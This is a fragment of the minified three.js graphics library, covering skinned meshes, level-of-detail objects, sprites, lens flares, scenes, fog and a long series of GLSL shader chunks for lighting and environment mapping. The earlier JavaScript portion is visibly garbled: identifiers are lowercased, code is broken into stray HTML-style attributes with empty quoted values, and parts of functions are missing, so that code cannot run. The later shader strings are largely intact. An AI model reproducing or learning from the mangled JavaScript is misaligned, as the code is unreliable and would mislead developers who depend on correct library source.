three.vector4,d=\"this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),b.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){THREE.Mesh.prototype.updateMatrixWorld.call(this,!0);\" attached\"=\"==this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\"\" \"detached\"=\"==this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\" three.skinnedmesh\"=\"\" unrecognized=\"\" bindmode:=\"\" \"+this.bindmode)},clone:function(){return(new=\"\" this.constructor(this.geometry,this.material,this.skeleton.usevertextexture)).copy(this)}});three.lod=\"function(){THREE.Object3D.call(this);this.type=\" lod\";object.defineproperties(this,{levels:{enumerable:!0,value:[]}})};\"=\"\" three.lod.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LOD,copy:function(a){THREE.Object3D.prototype.copy.call(this,a,!1);a=a.levels;for(var\" this},addlevel:function(a,b){void=\"\" d&&!(a<b[c].distance);c++);return=\"\" b[c-1].object},raycast:function(){var=\"\" three.vector3;return=\"\" function(b,c){a.setfrommatrixposition(this.matrixworld);var=\"\" three.vector3,b=\"new\" function(c){var=\"\" e=\"1,f=d.length;e<f;e++)if(c\">=\nd[e].distance)d[e-1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),tojson:function(a){a=three.object3d.prototype.tojson.call(this,a);a.object.levels=[];for(var b=\"this.levels,c=0,d=b.length;c<d;c++){var\" e=\"b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return\" a}});three.sprite=\"function(a){THREE.Object3D.call(this);this.type=\" sprite\";this.material=\"void\"\" 0!=\"=a?a:new\" three.spritematerial};=\"\" three.sprite.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Sprite,raycast:function(){var\" a=\"new\" three.vector3;return=\"\" function(b,c){a.setfrommatrixposition(this.matrixworld);var=\"\" d=\"b.ray.distanceSqToPoint(a);d\">this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,face:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});\nTHREE.LensFlare=function(a,b,c,d,e){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)};\nTHREE.LensFlare.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LensFlare,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensflares.push(a.lensflares[b]);return 0=\"==b&&(b=-1);void\" 2=\"\" this},add:function(a,b,c,d,e,f){void=\"\" three.color(16777215));void=\"\" c=\"Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var\" a,b=\"this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-c.rotation)}});\" three.scene=\"function(){THREE.Object3D.call(this);this.type=\" scene\";this.overridematerial=\"this.fog=this.background=null;this.autoUpdate=!0};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);THREE.Scene.prototype.constructor=THREE.Scene;\"\" three.scene.prototype.copy=\"function(a,b){THREE.Object3D.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return\" this};three.fog=\"function(a,b,c){this.name=\" \";this.color=\"new\"\" three.color(a);this.near=\"void\" 0!=\"=b?b:1;this.far=void\" three.fog.prototype.clone=\"function(){return\" new=\"\" three.fog(this.color.gethex(),this.near,this.far)};three.fogexp2=\"function(a,b){this.name=\" three.color(a);this.density=\"void\" three.fogexp2(this.color.gethex(),this.density)};three.shaderchunk=\"{};THREE.ShaderChunk.alphamap_fragment=\" #ifdef\"=\"\" use_alphamap\\n\\tdiffusecolor.a=\"\" *=\"texture2D(\" alphamap,=\"\" vuv=\"\" ).g;\\n#endif\\n\";three.shaderchunk.alphamap_pars_fragment=\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\" ;=\"\" three.shaderchunk.alphatest_fragment=\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\" ;three.shaderchunk.aomap_fragment=\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\" three.shaderchunk.aomap_pars_fragment=\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\" ;three.shaderchunk.begin_vertex=\"\\nvec3 transformed = vec3( position );\\n\" ;three.shaderchunk.beginnormal_vertex=\"\\nvec3 objectNormal = vec3( normal );\\n\" ;three.shaderchunk.bsdfs=\"bool testLightInRange( const in float lightDistance, const in float cutoffDistance ) {\\n\\treturn any( bvec2( cutoffDistance == 0.0, lightDistance < cutoffDistance ) );\\n}\\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\" three.shaderchunk.bumpmap_pars_fragment=\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\" three.shaderchunk.clipping_planes_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n#endif\\n\" ;three.shaderchunk.clipping_planes_pars_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\" three.shaderchunk.clipping_planes_pars_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\" ;three.shaderchunk.clipping_planes_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\" ;three.shaderchunk.color_fragment=\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\" ;three.shaderchunk.color_pars_fragment=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\" three.shaderchunk.color_pars_vertex=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\" ;three.shaderchunk.color_vertex=\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\" ;three.shaderchunk.common=\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\\n}\\n\" three.shaderchunk.cube_uv_reflection_fragment=\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ?  0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\" three.shaderchunk.defaultnormal_vertex=\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\" ;three.shaderchunk.displacementmap_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\" ;three.shaderchunk.displacementmap_pars_vertex=\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\" three.shaderchunk.emissivemap_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\" ;three.shaderchunk.emissivemap_pars_fragment=\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\" ;three.shaderchunk.encodings_pars_fragment=\"\\nvec4 LinearToLinear( in vec4 value ) {\\n  return value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n  return vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n  return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n  return vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n  float maxComponent = max( max( value.r, value.g ), value.b );\\n  float fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n  return vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n  return vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n  float maxRGB = max( value.x, max( value.g, value.b ) );\\n  float M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n  M            = ceil( M * 255.0 ) / 255.0;\\n  return vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n    return vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n    float maxRGB = max( value.x, max( value.g, value.b ) );\\n    float D      = max( maxRange / maxRGB, 1.0 );\\n    D            = min( floor( D ) / 255.0, 1.0 );\\n    return vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n  vec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n  Xp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n  vec4 vResult;\\n  vResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n  float Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n  vResult.w = fract(Le);\\n  vResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n  return vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n  float Le = value.z * 255.0 + value.w;\\n  vec3 Xp_Y_XYZp;\\n  Xp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n  Xp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n  Xp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n  vec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n  return vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\" three.shaderchunk.encodings_fragment=\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\" ;three.shaderchunk.envmap_fragment=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\" three.shaderchunk.envmap_pars_fragment=\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntenstiy;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\" three.shaderchunk.envmap_pars_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\" ;three.shaderchunk.envmap_vertex=\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = 